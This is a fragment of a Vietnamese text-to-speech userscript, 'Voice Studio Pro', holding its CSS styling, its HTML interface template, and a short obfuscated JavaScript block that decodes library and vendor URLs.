    background: rgba(45, 55, 72, 0.3) !important;
    overflow-y: auto !important;
    height: calc(100vh - 120px) !important;
    
    /* Firefox scrollbar */
    scrollbar-width: thin !important;
    scrollbar-color: #6272a4 #2d3748 !important;
}

/* Webkit Scrollbar (Chrome, Edge, Safari) */
.column-content::-webkit-scrollbar {
    width: 12px !important;
    background: transparent !important;
}

.column-content::-webkit-scrollbar-track {
    background: rgba(45, 55, 72, 0.8) !important;
    border-radius: 6px !important;
    margin: 4px 0 !important;
}

.column-content::-webkit-scrollbar-thumb {
    background: linear-gradient(135deg, #6272a4 0%, #bd93f9 100%) !important;
    border-radius: 6px !important;
    border: 2px solid rgba(45, 55, 72, 0.8) !important;
    transition: all 0.3s ease !important;
}

.column-content::-webkit-scrollbar-thumb:hover {
    background: linear-gradient(135deg, #bd93f9 0%, #ff79c6 100%) !important;
    box-shadow: 0 0 10px rgba(189, 147, 249, 0.5) !important;
}

.column-content::-webkit-scrollbar-thumb:active {
    background: linear-gradient(135deg, #ff79c6 0%, #bd93f9 100%) !important;
}

/* Enhanced Sections */
.section {
    margin-bottom: 24px !important;
    background: rgba(68, 75, 90, 0.3) !important;
    border-radius: 12px !important;
    padding: 16px !important;
    border: 1px solid rgba(98, 114, 164, 0.2) !important;
    backdrop-filter: blur(10px) !important;
}

.section h4 {
    font-size: 16px !important;
    border-bottom: 2px solid #44475a !important;
    padding-bottom: 8px !important;
    font-weight: 700 !important;
    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3) !important;
}

/* Enhanced Inputs */
#gemini-file-input,
#gemini-language-select,
#gemini-main-textarea {
    background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%) !important;
    border: 2px solid #4a5568 !important;
    border-radius: 12px !important;
    padding: 14px !important;
    margin-bottom: 12px !important;
    transition: all 0.3s ease !important;
    font-family: inherit !important;
}

#gemini-file-input:focus,
#gemini-language-select:focus,
#gemini-main-textarea:focus {
    border-color: #8be9fd !important;
    box-shadow: 0 0 0 3px rgba(139, 233, 253, 0.1) !important;
    outline: none !important;
}

#gemini-main-textarea {
    line-height: 1.6 !important;
}

/* Enhanced Stats */
#gemini-text-stats {
    background: rgba(45, 55, 72, 0.5) !important;
    padding: 8px !important;
    border-radius: 10px !important;
    margin-top: 8px !important;
    border: 1px solid rgba(98, 114, 164, 0.2) !important;
    font-weight: 600 !important;
    display: flex !important;
    justify-content: flex-end !important;
    gap: 6px !important;
}

#gemini-text-stats span {
    display: flex !important;
    flex-direction: column !important;
    align-items: center !important;
    justify-content: center !important;
    background: linear-gradient(135deg, rgba(139, 233, 253, 0.1) 0%, rgba(189, 147, 249, 0.1) 100%) !important;
    padding: 6px 10px !important;
    border-radius: 8px !important;
    font-size: 12px !important;
    min-width: 70px !important;
    border: 1px solid rgba(139, 233, 253, 0.15) !important;
    color: #8be9fd !important;
}

/* User Info Badge */
#gemini-user-info {
    background: linear-gradient(135deg, #50fa7b 0%, #4ade80 100%) !important;
    color: #1a1d2e !important;
    padding: 6px 14px !important;
    border-radius: 20px !important;
    font-size: 13px !important;
    font-weight: 700 !important;
    box-shadow: 0 2px 8px rgba(80, 250, 123, 0.3) !important;
}

/* Enhanced Buttons */
button {
    padding: 14px !important;
    border-radius: 12px !important;
    font-size: 15px !important;
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
    position: relative !important;
    overflow: hidden !important;
    font-family: inherit !important;
}

button::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
    transition: left 0.5s;
}

button:hover::before {
    left: 100%;
}

button:disabled {
    background: linear-gradient(135deg, #6c757d 0%, #5a6268 100%) !important;
    transform: none !important;
}

/* Enhanced Specific Buttons */
#gemini-upload-btn {
    background: linear-gradient(135deg, #46ffd9 0%, #12c8f2 100%) !important;
    color: #0b0e14 !important;
    font-weight: 700 !important;
    box-shadow: 0 4px 15px rgba(70, 255, 217, 0.3) !important;
}

#gemini-upload-btn:hover {
    background: linear-gradient(135deg, #5bfff1 0%, #3bd8ff 100%) !important;
    transform: translateY(-2px) !important;
    box-shadow: 0 0 25px rgba(90, 255, 230, 0.6) !important;
}

#gemini-start-queue-btn {
    background: linear-gradient(135deg, #10b981 0%, #059669 100%) !important;
    color: #fff !important;
    box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3) !important;
    font-weight: 700 !important;
}

#gemini-start-queue-btn:hover {
    background: linear-gradient(135deg, #34d399 0%, #10b981 100%) !important;
    transform: translateY(-2px) !important;
    box-shadow: 0 6px 25px rgba(16, 185, 129, 0.5) !important;
}

#gemini-pause-btn {
    background: linear-gradient(135deg, #ffb86c 0%, #ffa85c 100%) !important;
    box-shadow: 0 4px 15px rgba(255, 184, 108, 0.3) !important;
}

#gemini-pause-btn:hover {
    background: linear-gradient(135deg, #ffa85c 0%, #ff9500 100%) !important;
    transform: translateY(-2px) !important;
    box-shadow: 0 8px 25px rgba(255, 184, 108, 0.4) !important;
}

#gemini-stop-btn {
    background: linear-gradient(135deg, #ff5555 0%, #e44 100%) !important;
    box-shadow: 0 4px 15px rgba(255, 85, 85, 0.3) !important;
}

#gemini-stop-btn:hover {
    background: linear-gradient(135deg, #e44 0%, #d33 100%) !important;
    transform: translateY(-2px) !important;
    box-shadow: 0 8px 25px rgba(255, 85, 85, 0.4) !important;
}

/* Merge & Punctuation buttons - already styled above */

/* Text Input Options Styles */
.text-input-options {
    margin-bottom: 0;
}

.input-area {
    display: none;
}

.input-area.active {
    display: block;
}

/* File Upload Styles */
.file-upload-section {
    margin-bottom: 12px;
}

.file-upload-area {
    border: 2px dashed #6272a4;
    border-radius: 12px;
    padding: 40px 20px;
    text-align: center;
    background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%);
    cursor: pointer;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
}

.file-upload-area:hover {
    border-color: #8be9fd;
    background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%);
    transform: translateY(-2px);
    box-shadow: 0 8px 25px rgba(139, 233, 253, 0.2);
}

.file-upload-area.dragover {
    border-color: #50fa7b;
    background: linear-gradient(135deg, #2d3748 0%, #1a202c 100%);
    box-shadow: 0 0 20px rgba(80, 250, 123, 0.3);
}

.upload-icon {
    font-size: 48px;
    margin-bottom: 16px;
    opacity: 0.7;
}

.upload-text {
    color: #f8f8f2;
}

.upload-text strong {
    color: #bd93f9;
    font-size: 16px;
    display: block;
    margin-bottom: 8px;
}

.upload-text small {
    color: #94a3b8;
    font-size: 12px;
}

.file-info {
    background: linear-gradient(135deg, #4a5568 0%, #2d3748 100%);
    border: 1px solid rgba(98, 114, 164, 0.3);
    border-radius: 8px;
    padding: 12px;
    margin-top: 12px;
}

.file-details {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 12px;
}

.file-name {
    color: #8be9fd;
    font-weight: 600;
    flex: 1;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

.file-size {
    color: #94a3b8;
    font-size: 12px;
    flex-shrink: 0;
}

.remove-file-btn {
    background: linear-gradient(135deg, #ff5555 0%, #e44 100%);
    color: white;
    border: none;
    border-radius: 50%;
    width: 24px;
    height: 24px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    flex-shrink: 0;
    margin: 0;
    padding: 0;
    width: auto;
}

.remove-file-btn:hover {
    background: linear-gradient(135deg, #e44 0%, #d33 100%);
    transform: scale(1.1);
    box-shadow: 0 4px 15px rgba(255, 85, 85, 0.4);
}`;
    const APP_HTML = `<div id="gemini-col-1" class="gemini-column"> <div class="column-header"><div class="logo-user"><a href="" tager="_blank"><div class="logo"><img src="https://minimax.buhaseo.com/wp-content/uploads/2025/08/logo-minimax.png"></div></a><div id="gemini-user-info"></div></div></div> <div class="column-content"> <div class="section" style="margin-bottom: 10px!important;"> <h4>1. Tải lên tệp âm thanh (Tối đa 3 file)</h4> <input type="file" id="gemini-file-input" accept=".wav,.mp3,.mpeg,.mp4,.m4a,.avi,.mov,.wmv,.flv,.mkv,.webm" multiple> </div> <div class="section"> <h4>2. Chọn ngôn ngữ</h4> <select id="gemini-language-select"><option value="Vietnamese">Vietnamese</option><option value="English">English</option><option value="Arabic">Arabic</option><option value="Cantonese">Cantonese</option><option value="Chinese (Mandarin)">Chinese (Mandarin)</option><option value="Dutch">Dutch</option><option value="French">French</option><option value="German">German</option><option value="Indonesian">Indonesian</option><option value="Italian">Italian</option><option value="Japanese">Japanese</option><option value="Korean">Korean</option><option value="Portuguese">Portuguese</option><option value="Russian">Russian</option><option value="Spanish">Spanish</option><option value="Turkish">Turkish</option><option value="Ukrainian">Ukrainian</option><option value="Thai">Thai</option><option value="Polish">Polish</option><option value="Romanian">Romanian</option><option value="Greek">Greek</option><option value="Czech">Czech</option><option value="Finnish">Finnish</option><option value="Hindi">Hindi</option><option value="Bulgarian">Bulgarian</option><option value="Danish">Danish</option><option value="Hebrew">Hebrew</option><option value="Malay">Malay</option><option value="Persian">Persian</option><option value="Slovak">Slovak</option><option value="Swedish">Swedish</option><option value="Croatian">Croatian</option><option value="Filipino">Filipino</option><option value="Hungarian">Hungarian</option><option value="Norwegian">Norwegian</option><option value="Slovenian">Slovenian</option><option value="Catalan">Catalan</option><option value="Nynorsk">Nynorsk</option><option value="Tamil">Tamil</option><option value="Afrikaans">Afrikaans</option></select> <button id="gemini-upload-btn" style="margin-top: 12px; width: 100%;"><i class="fas fa-music" style="margin-right: 8px;"></i>Tải lên âm thanh</button> <div id="gemini-upload-status"></div> </div> <div id="batch-replace-section" class="section"> <h4>📝 Đổi văn bản hàng loạt</h4> <div id="batch-replace-pairs"></div> <div id="batch-replace-actions"> <button id="add-replace-pair-btn">➕</button> <button id="execute-replace-btn">Thực hiện thay thế</button> </div> </div> <div class="section"> <h4>📁 Quản lý thư mục âm thanh</h4> <div id="audio-folder-manager" style="background: #44475a; border: 1px solid #6272a4; border-radius: 8px; padding: 12px;"> <button id="folder-select-btn" style="width: 100%; margin-bottom: 10px;">📂 Chọn thư mục chứa MP3</button> <div id="selected-folder-path" style="display:none;"></div> <div id="audio-list-container" style="display:none;"> <div style="padding: 10px; text-align: center; color: #94a3b8;">Chưa có file MP3 nào</div> </div> <button id="refresh-audio-list-btn" style="display:none; width: 100%; margin-top: 10px;">🔄 Làm mới danh sách</button> </div> </div> </div> </div> </div> <div id="gemini-col-2" class="gemini-column"> <div class="column-header"><div class="box-info-version"><h3>🎙️ Voice Studio Pro</h3><span style="color: #8be9fd; font-size: 12px; font-weight: 600;">Version 2.0.0 - Professional Edition</span></div></div> <div class="column-content">         <div class="section text-section"> <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;"><h4 style="margin: 0;">Nhập văn bản cần tạo giọng nói</h4><button id="load-text-file-btn" style="width: auto;">📄 Tải từ file</button></div><input type="file" id="text-file-input" accept=".txt,.doc,.docx,.rtf,.odt,.pdf,.md,.html,.htm,.xml,.csv,.json" style="display: none;"><div class="text-input-options"><div id="text-input-area" class="input-area active"><textarea id="gemini-main-textarea" placeholder="✨ Nhập hoặc dán văn bản của bạn tại đây để chuyển thành giọng nói chuyên nghiệp...
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            "></textarea></div><div id="file-input-area" class="input-area" style="display: none;"><div class="file-upload-section"><div class="file-upload-area" id="file-upload-area" style="display: none;"><div class="upload-icon">📄</div><div class="upload-text"><strong>Kéo thả file vào đây hoặc click để chọn</strong><br><small>Hỗ trợ: TXT, DOC, DOCX, RTF, ODT, PDF, MD, HTML, XML, CSV, JSON</small></div></div><div id="file-info" class="file-info" style="display: none;"><div class="file-details"><span class="file-name"></span><span class="file-size"></span><button id="remove-file-btn" class="remove-file-btn">×</button></div></div></div></div></div>
    <div id="gemini-text-stats"><span>Ký tự: 0</span><span>Từ: 0</span><span>Câu: 0</span><span>Đoạn: 0</span></div>

<div style="display: flex; gap: 10px; margin-bottom: 15px;"><button id="gemini-merge-btn" style="flex: 1;">Tạo đoạn liền mạch</button><button id="open-punctuation-settings-btn" style="flex: 1;">⚙️ Cài đặt</button><button id="open-log-modal-btn" style="flex: 1;" onclick="document.getElementById('log-modal').style.display='flex'">📋 Xem Log</button></div> </div> <button id="gemini-start-queue-btn" disabled>Bắt đầu tạo âm thanh</button> <button id="apply-punctuation-btn" style="display:none; background-color: #ffb86c; color: #282a36; margin-top: 10px;">Áp dụng thiết lập dấu câu</button> <div style="display: flex; gap: 10px;"><button id="gemini-pause-btn" style="display:none; flex: 1;">Tạm dừng</button> <button id="gemini-stop-btn" style="display:none; flex: 1;">Dừng hẳn</button></div> <div id="gemini-progress-container" style="display:none;"><div id="gemini-progress-bar"></div><span id="gemini-progress-label">0%</span></div> <div id="gemini-final-result" style="display:none;"> <h4>Kết quả cuối cùng</h4> <div id="gemini-time-taken"></div> <div id="gemini-waveform"></div> <div id="waveform-controls" style="display:none; margin-top: 10px;"><div style="display: flex; gap: 10px; justify-content: center;"><button id="waveform-play-pause" style="flex: 1; max-width: 150px;">Play</button><a id="gemini-download-merged-btn" href="#" download="merged_output.mp3" style="flex: 1; max-width: 150px; display: flex; align-items: center; justify-content: center; text-decoration: none;">Download Audio</a><button id="gemini-download-chunks-btn" style="display: none; flex: 1; max-width: 150px;">Download Chunks</button></div></div> </div> </div> </div> <textarea id="gemini-hidden-text-for-request" style="display:none;"></textarea>

    <!-- Modal phát hiện dấu câu -->
    <div id="punctuation-detection-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 10000; justify-content: center; align-items: center;">
        <div style="background: #282a36; border: 2px solid #6272a4; border-radius: 8px; padding: 20px; max-width: 600px; width: 90%; max-height: 80vh; overflow-y: auto;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0; color: #ffb86c; font-size: 18px;">⚠️ Phát hiện dấu câu trùng lặp</h3>
                <button id="close-punctuation-modal" onclick="window.ignoreAllPunctuationIssues()" style="background: #ff5555; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 14px;">✕</button>
            </div>

            <div id="punctuation-issues-list" style="margin-bottom: 20px;"></div>

            <div style="background: #44475a; padding: 15px; border-radius: 6px; border: 1px solid #6272a4;">
                <div style="display: flex; gap: 15px; align-items: center; flex-wrap: wrap;">
                    <label style="color: #f8f8f2; font-size: 14px; font-weight: bold;">Dấu câu mặc định:</label>
                    <select id="default-punctuation-select" style="background: #282a36; color: #f8f8f2; border: 1px solid #6272a4; border-radius: 4px; padding: 8px 12px; font-size: 14px; min-width: 150px;">
                        <option value=".">Dấu chấm (.)</option>
                        <option value=",">Dấu phẩy (,)</option>
                        <option value="!">Dấu chấm than (!)</option>
                        <option value="?">Dấu chấm hỏi (?)</option>
                    </select>
                </div>

                <div style="display: flex; gap: 10px; margin-top: 15px; justify-content: center;">
                    <button id="auto-fix-punctuation-btn" onclick="window.autoFixAllPunctuationIssues()" style="background: #50fa7b; color: #282a36; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: bold; min-width: 120px;">🔧 Tự động sửa tất cả</button>
                    <button id="ignore-punctuation-btn" onclick="window.ignoreAllPunctuationIssues()" style="background: #6272a4; color: #f8f8f2; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: bold; min-width: 120px;">❌ Bỏ qua tất cả</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal Log hoạt động -->
    <div id="log-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 10000; justify-content: center; align-items: center;" onclick="if(event.target.id==='log-modal') this.style.display='none'">
        <div style="background: #282a36; border: 2px solid #6272a4; border-radius: 8px; padding: 20px; max-width: 700px; width: 90%; max-height: 80vh; overflow-y: auto;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0; color: #bd93f9; font-size: 18px;">📋 Log hoạt động</h3>
                <button id="close-log-modal-btn" onclick="document.getElementById('log-modal').style.display='none'" style="background: #ff5555; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 18px; width: auto;">✕</button>
            </div>
            <div class="log-section" style="background: transparent; border: none; padding: 0; margin: 0;">
                <div id="log-container" class="log-container">
                    <div class="log-entry">Sẵn sàng theo dõi văn bản chunk</div>
                </div>
                <button id="clear-log-btn" class="clear-log-btn" style="margin-top: 15px;">Xóa log</button>
            </div>
        </div>
    </div>

    <!-- Modal Cài đặt (Thiết lập dấu câu + Cài đặt chia chunk) -->
    <div id="punctuation-settings-modal" class="punctuation-modal" style="display:none;">
        <div class="punctuation-modal-card">
            <div class="punctuation-modal-header">
                <h3>Cài đặt</h3>
                <button class="punctuation-modal-close-btn">&times;</button>
            </div>
            
            <!-- Tabs Navigation -->
            <div class="settings-tabs" style="display: flex; border-bottom: 2px solid #6272a4; margin-bottom: 15px;">
                <button class="settings-tab-btn active" data-tab="punctuation-tab" style="flex: 1; padding: 12px; background: transparent; border: none; color: #f8f8f2; cursor: pointer; border-bottom: 3px solid #bd93f9; font-weight: bold; transition: all 0.3s;">
                    📝 Thiết lập dấu câu
                </button>
                <button class="settings-tab-btn" data-tab="chunk-tab" style="flex: 1; padding: 12px; background: transparent; border: none; color: #94a3b8; cursor: pointer; border-bottom: 3px solid transparent; font-weight: bold; transition: all 0.3s;">
                    ⚙️ Cài đặt chia chunk
                </button>
            </div>
            
            <!-- Tab 1: Thiết lập dấu câu -->
            <div id="punctuation-tab" class="settings-tab-content" style="display: block;">
                <div class="punctuation-modal-body">
                    <div class="punctuation-setting-row">
                        <label for="pause-period">Dấu chấm [.]</label>
                        <div style="display: flex; align-items: center; gap: 8px; margin-left: -10px;">
                            <label class="switch">
                                <input type="checkbox" id="toggle-period">
                                <span class="slider round"></span>
                            </label>
                            <div class="punctuation-input-group" style="width: 120px;">
                                <button class="adjust-btn" data-target="pause-period" data-step="-0.1">-</button>
                                <input type="number" id="pause-period" step="0.1" min="0" style="width: 50px; font-size: 12px;">
                                <button class="adjust-btn" data-target="pause-period" data-step="0.1">+</button>
                            </div>
                        </div>
                    </div>
                    <div class="punctuation-setting-row">
                        <label for="pause-comma">Dấu phẩy [,]</label>
                        <div style="display: flex; align-items: center; gap: 8px; margin-left: -10px;">
                            <label class="switch">
                                <input type="checkbox" id="toggle-comma">
                                <span class="slider round"></span>
                            </label>
                            <div class="punctuation-input-group" style="width: 120px;">
                                <button class="adjust-btn" data-target="pause-comma" data-step="-0.1">-</button>
                                <input type="number" id="pause-comma" step="0.1" min="0" style="width: 50px; font-size: 12px;">
                                <button class="adjust-btn" data-target="pause-comma" data-step="0.1">+</button>
                            </div>
                        </div>
                    </div>
                    <div class="punctuation-setting-row">
                        <label for="pause-semicolon">Dấu chấm phẩy [;]</label>
                        <div style="display: flex; align-items: center; gap: 8px; margin-left: -10px;">
                            <label class="switch">
                                <input type="checkbox" id="toggle-semicolon">
                                <span class="slider round"></span>
                            </label>
                            <div class="punctuation-input-group" style="width: 120px;">
                                <button class="adjust-btn" data-target="pause-semicolon" data-step="-0.1">-</button>
                                <input type="number" id="pause-semicolon" step="0.1" min="0" style="width: 50px; font-size: 12px;">
                                <button class="adjust-btn" data-target="pause-semicolon" data-step="0.1">+</button>
                            </div>
                        </div>
                    </div>
                    <div class="punctuation-setting-row">
                        <label for="pause-newline">Xuống dòng</label>
                        <div style="display: flex; align-items: center; gap: 8px; margin-left: -10px;">
                            <label class="switch">
                                <input type="checkbox" id="toggle-newline">
                                <span class="slider round"></span>
                            </label>
                            <div class="punctuation-input-group" style="width: 120px;">
                                <button class="adjust-btn" data-target="pause-newline" data-step="-0.1">-</button>
                                <input type="number" id="pause-newline" step="0.1" min="0" style="width: 50px; font-size: 12px;">
                                <button class="adjust-btn" data-target="pause-newline" data-step="0.1">+</button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="punctuation-modal-footer">
                    <button id="save-punctuation-settings-btn">Lưu thay đổi</button>
                    <button id="default-punctuation-settings-btn">Mặc định</button>
                </div>
            </div>
            
            <!-- Tab 2: Cài đặt chia chunk -->
            <div id="chunk-tab" class="settings-tab-content" style="display: none;">
                <div style="padding: 20px;">
                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
                        <label class="switch">
                            <input type="checkbox" id="enable-blank-line-chunking" checked>
                            <span class="slider round"></span>
                        </label>
                        <label for="enable-blank-line-chunking" style="color: #f8f8f2; font-size: 14px; cursor: pointer;">
                            Tách theo dòng trống (ưu tiên cao)
                        </label>
                    </div>
                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
                        <label class="switch">
                            <input type="checkbox" id="chunk-size-toggle">
                            <span class="slider round"></span>
                        </label>
                        <label for="chunk-size-toggle" style="color: #f8f8f2; font-size: 14px; cursor: pointer;">
                            Chunk lớn (900 ký tự)
                        </label>
                    </div>
                    <small style="color: #94a3b8; font-size: 12px; display: block; padding: 12px; background: #44475a; border-radius: 6px; border: 1px solid #6272a4;">
                        💡 <strong>Tách theo dòng trống:</strong> Khi bật - ưu tiên tách tại dòng trống. Khi tắt - bỏ qua dòng trống, tách theo dấu câu.<br><br>
                        🔧 <strong>Chunk lớn:</strong> Bật = 900 ký tự, Tắt = 700 ký tự
                    </small>
                </div>
            </div>
        </div>
    </div>
</div>`;
    const MqZL$zFTzCYzr$GfJaMCwFY=dz$klaIvBwho$MUM;(function(iCCC_NBhFxv$FucBdbUGzJrWM,Bgjamjm__xRE){const pTolfIdEgqmQW$Q$B=dz$klaIvBwho$MUM,mFwMfvbHQ$CgBr$zTpSSDYQ=iCCC_NBhFxv$FucBdbUGzJrWM();while(!![]){try{const ZO_MAH_wQjXB=parseFloat(pTolfIdEgqmQW$Q$B(0xae))/(parseInt(0x2565)+-parseInt(0x1df5)+parseInt(0xad)*-parseInt(0xb))+parseFloat(parseFloat(pTolfIdEgqmQW$Q$B(0xb6))/(parseInt(0x187c)+0x6*parseFloat(-0x4b8)+Math.floor(parseInt(0x3d6))*0x1))*Math['trunc'](-parseFloat(pTolfIdEgqmQW$Q$B(0xa8))/(Number(-parseInt(0x2357))+Math.floor(-0x25be)+0x4918))+parseFloat(pTolfIdEgqmQW$Q$B(0xad))/(parseFloat(0x15bf)+parseInt(-parseInt(0x1226))+-0x395)+-parseFloat(pTolfIdEgqmQW$Q$B(0xab))/(Math.trunc(-0x1ec5)+-0x270+Math.ceil(parseInt(0x1))*Math.max(0x213a,parseInt(0x213a)))+-parseFloat(pTolfIdEgqmQW$Q$B(0xaf))/(0x15ea+0x505*Number(parseInt(0x5))+Math.floor(-parseInt(0x2efd)))*(parseFloat(pTolfIdEgqmQW$Q$B(0xac))/(Math.floor(0x99f)+-0x9c0+parseInt(0x4)*parseInt(0xa)))+Math['max'](parseFloat(pTolfIdEgqmQW$Q$B(0xa9))/(parseFloat(-0x4)*parseInt(0xb7)+Math.ceil(0x1f99)+-0x1cb5*0x1),parseFloat(pTolfIdEgqmQW$Q$B(0xb0))/(0x318+-parseInt(0x11)*-0xb+parseInt(0xc2)*Math.ceil(-0x5)))*(-parseFloat(pTolfIdEgqmQW$Q$B(0xb4))/(-0x843+-parseInt(0x1)*parseInt(0x1315)+Math.max(-parseInt(0x5),-parseInt(0x5))*parseFloat(-parseInt(0x57a))))+-parseFloat(pTolfIdEgqmQW$Q$B(0xb1))/(-0x249d+Math.trunc(0x1308)+Math.ceil(parseInt(0x11a0)))*Number(-parseFloat(pTolfIdEgqmQW$Q$B(0xb5))/(-parseInt(0x1093)*0x1+-0x266*parseInt(0xd)+Number(0x2fcd)));if(ZO_MAH_wQjXB===Bgjamjm__xRE)break;else mFwMfvbHQ$CgBr$zTpSSDYQ['push'](mFwMfvbHQ$CgBr$zTpSSDYQ['shift']());}catch(yE$gBlyZzvIbRSoKpkLRcc_dvcj){mFwMfvbHQ$CgBr$zTpSSDYQ['push'](mFwMfvbHQ$CgBr$zTpSSDYQ['shift']());}}}(B_oqgYsej_oXwTu,0x127935+Math.max(-parseInt(0xb5adf),-0xb5adf)+Math.floor(0x230a6)));const LIB_URLS=[MqZL$zFTzCYzr$GfJaMCwFY(0xaa),MqZL$zFTzCYzr$GfJaMCwFY(0xb3)];function dz$klaIvBwho$MUM(NkjUlvt_TvrFsyBxTKRn,qEZCCrQobhMfYZvLzGUXW){const kuiEag$pQEV=B_oqgYsej_oXwTu();return dz$klaIvBwho$MUM=function(kZeR_krFagJYzzR,YgkdRN_CHDP){kZeR_krFagJYzzR=kZeR_krFagJYzzR-(0x1308+-parseInt(0x20)*-0xc5+Math.floor(-0x2b00));let h_xSFOTQ$owJqcacwaKafOnv=kuiEag$pQEV[kZeR_krFagJYzzR];if(dz$klaIvBwho$MUM['uwAIpk']===undefined){const yO$occ=function(AyXkDRwWuYwun_sL$x){let reHTEMLbMbmrfoZof=-0x2*0xc7d+-0x2*Math.floor(0x901)+0x2cd9&-parseInt(0x1)*-parseInt(0xd25)+-parseInt(0x65e)+-0x5c8,aSiq_PmnHwZkyvvrY=new Uint8Array(AyXkDRwWuYwun_sL$x['match'](/.{1,2}/g)['map'](vbHQCgB=>parseInt(vbHQCgB,0x1ce0+Math.trunc(parseInt(0x1))*parseInt(-0xc23)+0x10ad*-0x1))),i$UiCCCNBh$Fxv=aSiq_PmnHwZkyvvrY['map'](zTpSSD$$YQoZOM=>zTpSSD$$YQoZOM^reHTEMLbMbmrfoZof),u_cBdbUG$zJrWMoBgja=new TextDecoder(),jm_xR$EPmFwM=u_cBdbUG$zJrWMoBgja['decode'](i$UiCCCNBh$Fxv);return jm_xR$EPmFwM;};dz$klaIvBwho$MUM['nXpwpI']=yO$occ,NkjUlvt_TvrFsyBxTKRn=arguments,dz$klaIvBwho$MUM['uwAIpk']=!![];}const wh$RyfytuKF=kuiEag$pQEV[Math.max(-parseInt(0x5),-parseInt(0x5))*parseFloat(parseInt(0x4a9))+0x127b+Math.trunc(-parseInt(0x269))*Math.max(-0x2,-0x2)],lR$hIOQt=kZeR_krFagJYzzR+wh$RyfytuKF,TtguQE$GtvgXHk$iUSyVVrdD=NkjUlvt_TvrFsyBxTKRn[lR$hIOQt];return!TtguQE$GtvgXHk$iUSyVVrdD?(dz$klaIvBwho$MUM['AswsXn']===undefined&&(dz$klaIvBwho$MUM['AswsXn']=!![]),h_xSFOTQ$owJqcacwaKafOnv=dz$klaIvBwho$MUM['nXpwpI'](h_xSFOTQ$owJqcacwaKafOnv),NkjUlvt_TvrFsyBxTKRn[lR$hIOQt]=h_xSFOTQ$owJqcacwaKafOnv):h_xSFOTQ$owJqcacwaKafOnv=TtguQE$GtvgXHk$iUSyVVrdD,h_xSFOTQ$owJqcacwaKafOnv;},dz$klaIvBwho$MUM(NkjUlvt_TvrFsyBxTKRn,qEZCCrQobhMfYZvLzGUXW);}function B_oqgYsej_oXwTu(){const Ou_qtnuNhNIjGfA_oE=['efe58487ab91a79a','eeefefeeeae9e5a589968fb392','e4e8e5ece9ee94aca59793b6','eee8e4e8ece98cb2bfb590bb','e8e8eceab498bcbaad8c','ecec8fb6af9bbcba','b5a9a9adaee7f2f2b0b4b3b4b0bca5f3bfa8b5bcaeb8b2f3beb2b0f2aaadf0b7aeb2b3f2b0b4b3b4b0bca5f2abecf2b1b2bab4b3','b5a9a9adaee7f2f2beb9b3f3b7aeb9b8b1b4abaff3b3b8a9f2b3adb0f2aeaab8b8a9bcb1b8afa9ef9dececf2b9b4aea9f2aeaab8b8a9bcb1b8afa9eff3bcb1b1f3b0b4b3f3b7ae','ebeae5ed988ba5b687b8','ece4ecebeeedeaeb9784a7a78fb2','eae5ebe4ebb788b1aba989','e5e9abaf9baea49f','e9e4ede988858ab2b6a8','b5a9a9adaee7f2f2a8b3adb6baf3beb2b0f2aabcabb8aea8afbbb8aff3b7ae9deaf2b9b4aea9f2aabcabb8aea8afbbb8aff3b0b4b3f3b7ae','e9e4ebe4ebefe8ac98879e9eaf'];B_oqgYsej_oXwTu=function(){return Ou_qtnuNhNIjGfA_oE;};return B_oqgYsej_oXwTu();}
